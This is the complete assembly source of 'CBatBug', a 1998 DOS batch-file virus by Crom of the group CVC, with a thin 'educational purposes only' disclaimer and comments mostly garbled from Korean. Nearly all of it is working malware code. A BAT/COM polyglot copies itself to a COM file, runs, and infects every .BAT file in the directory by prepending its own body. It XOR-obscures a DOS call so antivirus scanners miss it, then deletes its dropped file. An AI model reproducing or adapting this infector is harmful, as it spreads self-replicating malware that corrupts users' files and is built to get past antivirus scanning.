;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>
;
;                                            \\\\\\\  \       \   \\\\\\\
;     CBatBug                               \          \     \   \
;                 by Crom of CVC            \           \   \    \    98/05
;                                           \            \ \     \
;                                            \\\\\\\      \       \\\\\\\ #04
;
; Virus Name : CBatBug (CVC Batch Bug)
; Author     : Crom
; Group      : CVC
; Origin     : Corea
; Date       : 1998/03/21
; Type       : Non memory resident BAT
;
;  !*< ��I�� ���� >********************************************************!
;   *                                                                        *
;   * �w�� !                                                                 *
;   *        �� �����e �a�B�ⷥ ����a���e �a�w�A�ᴡ �s���a. �����e ��      *
;   *        �����i �a�wЁ�� �i���a�e ��� ���A�A ��Ё�ᕡ �����i ���� �g    *
;   *        �s���a. ���e �����e �i�i ���e �a�q�A�A ���s���a.                *
;   *                                                                        *
;   * Warning !                                                              *
;   *        This information is for educational purposes only. We are       *
;   *        not responsible for any problems caused by the use of this      *
;   *        information. Responsibility is entirely placed on the reader    *
;   *                                                                        *
;   !************************************************************************!
;
; �e���A�� �A�b�E �a����a�� ��á �a���i �q�q ��ǡ�e �A���� �a����a���a !
; �� �a����a�A ���e �a�A�e ��w�e CVC #04 �A �����e�a. ��Ё�i ��Ё��e ���� ��
; �� �a�e�a.
;
; ���q�a�� ��á �a�� �q�q �a����a�a ���a�w Ж�a�� ���b�a�e �a ���b�i ��a�a.
;
; �a����a�A �q�q�E BAT �a���� ��З�A�e COM �a���i �����a�� �a �a���i ��З��ǥ
; �a. �a �a���e �e�� ���Bɡ���A ���e ���e BAT �a���i �q�q��ǥ�a. �a����, ���w��
; �� ��á �a���� ��З�E�a. ���s�� �g�e�a ?
;
; COM ���a EXE �a���i �q�q ��ǡ�e �a����a�� ѥ�s�A�e �w�bЁ ���� ���a.
; ���q�e �a����a�a �|�����A ����Ё ��A á�a �i �� ���a�a �� ҁ���w ��á �a��
; �q�q �a����a�i �奡�� ���b���a. �a��, AV �A�b�a�i�� �E�� �����e ���aϡ �a�a
;
;
;
;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>


            .MODEL  TINY
            .CODE

            org   100h

 Bat_Vir:
            db    '::'                      ; BATCH �a�����a�e �������e ����
            jmp   Start                     ; �E�a. (�A���i�� �����E�a.)
            db    0Dh,0Ah                   ;

            db    'copy  %0 cbb.com > NUL',0Dh,0Ah ; 123.COM �a�� ����
            db    'cbb',0Dh,0Ah             ; �a����a ��З
            db    'goto Start!',0Dh,0Ah     ; ���� ��á �a�� ��З
;
;  �᷁ š�a ���w�e �a�q�� �{�a. COM �a���� ��З�A��a�� CMP BH,[BP+SI] �e ��
;  З�A ���a ���A �A�� �g�e�����a.
;  0100 3A3A          CMP     BH,[BP+SI]
;  0102 EB2F          JMP     0133
;  0104 90            NOP
;  0105 0D0A63        OR      AX,630A
;
; 1. ��á �a���� ��З�E�a�e �e�� ��á �a���i 123.COM �a�� ��З�a�� OrgBatch
;    �A���i�� ���a�e�a.
;
; 2. COM �a���� ��З�E�a�e ���e COM �a�� �w���a�� ��З�E�a. '::' �e ���� ���e
;    �w�w���a. �a����, �a�� ���a �w�w�a�� Start �� �e�a. �� ���e З���� �a�w
;    �a�A Ё�� ���I �b�A �q�a�a���a !
;

 Start:
            mov   ah, 2Fh                   ; DTA ���a��
            int   21h
            push  es                        ; DTA �t ��w
            push  bx

;
; 1Ah �i �qѡ�� ��ǡ�� �g�a�e �e�E�a. 1Ah �e �B�a�a �a���A��e EOF (End Of File)
; ���a. ��q�A ���� �q�q�E BAT �a���i ��ЗЁ�� �A���i�i �x�i �� ���a�� �a����
; �� ���� ���v�e�A �a���A �i�� ���� 1Ah �����A 1Ah ��ҁ�� ���w�� �A�����A ����
; �a�� �g�v�a. 1Ah �e �� �qѡ�� ��ǡ�a
;
;
            mov   ah, (1Ah xor 15h)         ; ������ DTA ���
            mov   dx, offset NewDTA
            xor   ah, 15h
            int   21h

            mov   ah, 4Eh                   ; BAT �a�� �x��
            mov   cx, 00100011B             ; ������w/�����a��
            mov   dx, offset Mask_BAT       ; *.BAT
 Find_repeat:
            int   21h                       ;
            jc    Terminate                 ; �A��e ���a

 Infect_BAT:

            mov   ax, 3D02h                 ; �a�� ���e
            mov   dx, offset NewDTA[1Eh]    ;
            int   21h
            jc    Terminate

            xchg  ax,bx                     ; Ѕ�i �苡

            mov   ah, 3Fh                   ; ���� BAT �����e�q ���� �i����
            mov   cx, word ptr NewDTA[26]   ; ����
            mov   dx, offset Buffer         ; ����
            int   21h

            mov   ax,4200h                  ; �a���i ���� �i�v�a�a�� ͡����a
            xor   cx,cx                     ; ����Ж�a�a�� �a�� ��q�a�� ����
            xor   dx,dx                     ; ��ǥ�a.
            int   21h

            cmp   word ptr Buffer, '::'     ; �q�q �a�� ��a
            jnz   Write_vir
            cmp   byte ptr Buffer+2, 0EBh
            jz    Infected

 Write_vir:
            mov   ah,  40h                  ; �a����a �a��
            mov   cx, offset End_Virus - 100h
            add   cx, word ptr NewDta[26]   ; �i ���� = �a����a + ���� BAT
            mov   dx, 100h                  ; ����
            int   21h

 Infected:
            mov   ah, 3eh                  ; �a�� �h��
            int   21h

            mov   ah, 4Fh                  ; �a�q BAT �a�� �x��
            jmp   Find_repeat

 Terminate:
            pop   dx
            pop   ds
            mov   ah, (1Ah xor 15h)        ; DTA �� ���
            xor   ah, 15h
            int   21h

            mov   ax,4c00h                 ; ���a
            int   21h

            db    '[CBatBug]'
            db    '(c) Copyleft 1997-1998 by Crom/CVC,Corea'

 Mask_BAT   db    '*.BAT',0                ; BAT �a�� �x��
 NewDTA     db    30h dup (?)
            db    0Dh,0Ah,':Start!',0Dh,0Ah
            db    0Dh,0Ah,'del cbb.com > nul',0Dh,0Ah
 End_Virus:
 Buffer:                                   ;

            END   Bat_Vir

